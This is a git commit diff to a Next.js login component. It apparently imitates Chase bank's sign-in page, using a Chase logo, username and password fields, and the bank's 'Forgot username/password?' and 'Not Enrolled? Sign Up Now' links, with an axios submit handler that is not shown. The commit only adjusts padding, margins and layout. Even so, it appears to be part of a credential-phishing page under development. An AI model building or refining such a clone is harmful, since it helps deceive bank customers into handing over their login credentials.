5d7664c1eb30eccf60a4631776e53eec39435047
Xqlusive23 <ayoimisi@gmail.com>
2024-05-23 13:58:14 +0100

    follow

--- app/components/main.tsx
+++ app/components/main.tsx
@@ -2,7 +2,7 @@
 "use client"
 import axios from "axios";
 import Image from "next/image";
-import { useState } from "react";
+import { useEffect, useState } from "react";
 
 export default function Main() {
 
@@ -49,6 +49,23 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
     setIsLoading(false);
   }
 };
+// const MyComponent = () => {
+//   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
+
+//   useEffect(() => {
+//     const handleResize = () => {
+//       setIsMobile(window.innerWidth <= 768);
+//     };
+
+//     window.addEventListener('resize', handleResize);
+
+//     return () => {
+//       window.removeEventListener('resize', handleResize);
+//     };
+//   }, []);
+
+//   const backgroundColor = isMobile? 'black' : 'url("/assets/background.jpg")';
+
   return (
     <main 
       className="header-container"
@@ -57,27 +74,27 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
       backgroundImage: "url('/assets/background.jpg')",
       backgroundAttachment: "fixed",
       backgroundSize: 'cover',
-      padding:'15px',
+      padding:'25px 15%',
       backgroundRepeat: 'no-repeat',
       backgroundPosition: 'center',
-      height: '100vh', // Example height, adjust as needed
+      height: '80vh', // Example height, adjust as needed
       width: '100%', // Example width, adjust as needed
       zIndex:9999}}
       >
       <div className="flex justify-center items-center">
-        <img src="/assets/chase.png" alt="logo" className="w-64 mt-10 filter contrast-200"  />
+        <img src="/assets/chase.png" alt="logo" className="w-64 mt-1 mb-20 filter contrast-200"  />
       </div>
-    <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto mt-32 px-4 filter contrast-100">
-      <div className="items-center justify-center space-y-4 p-8 rounded-md shadow-xl bg-white w-auto">
+    <div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto mt-30 px-4 filter contrast-100">
+      <div className="flex flex-col items-center justify-center space-y-4 p-8 rounded-md shadow-xl bg-white w-full">
           
-          <form onSubmit={handleSubmit} className=" space-y-5 p-8 rounded-md shadow-x1 ">
+          <form onSubmit={handleSubmit} className=" space-y-5 p-8 rounded-md shadow-x1">
         <label htmlFor="username" className="block text-sm font-medium text-gray-500">Username</label>
         <input
           id="username"
           type="text"
           value={username}
           onChange={(e) => setUsername(e.target.value)}
-          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0 mb-10 mt-10"
+          className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
         />
         <label htmlFor="password" className="block text-sm font-medium text-gray-500">Password</label>
         <input
@@ -86,6 +103,7 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
           onChange={(e) => setPassword(e.target.value)}
           className="w-full shadow-md p-2 rounded focus:outline-none focus:ring-0"
         />
+        
         <button
           disabled={isLoading}
           className={`w-full ${isLoading? "bg-gray-400 cursor-not-allowed py-2 px-4" : "bg-blue-500 hover:bg-[#1c3666] text-white font-bold py-2 px-4 rounded"}`}
@@ -98,18 +116,18 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
             "Sign in"
           )}
         </button>
-        <div className="text-blue-400">
-        <span>Forgot username/password?</span> <br />
-        <span>Not Enrolled? Sign Up Now</span>
+        <div className="text-blue-400 text-sm">
+        <span>Forgot username/password? </span> <br />
+        <span>Not Enrolled? Sign Up Now </span>
         </div>
       </form>
       
         </div>
         <div className="flex justify-center items-center flex-col">
-          <span className="text-center text-gray-500 -mb-32 mt-80">Follow Us:</span>
+          <span className="text-center text-gray-500 mt-48">Follow Us:</span>
         </div>
         </div>
-        <div style={{textAlign: 'center', padding:'25px 20%' , marginTop:'6%'}}>
+        <div style={{textAlign: 'center', padding:'25px 4%' , marginTop:'-2%'}}>
   <hr style={{borderTop: '1px solid #000', marginTop: '20px'}} />
 </div>
 
@@ -117,3 +135,4 @@ const handleSubmit = async (event: { preventDefault: () => void; }) => {
    
   );
 }
+
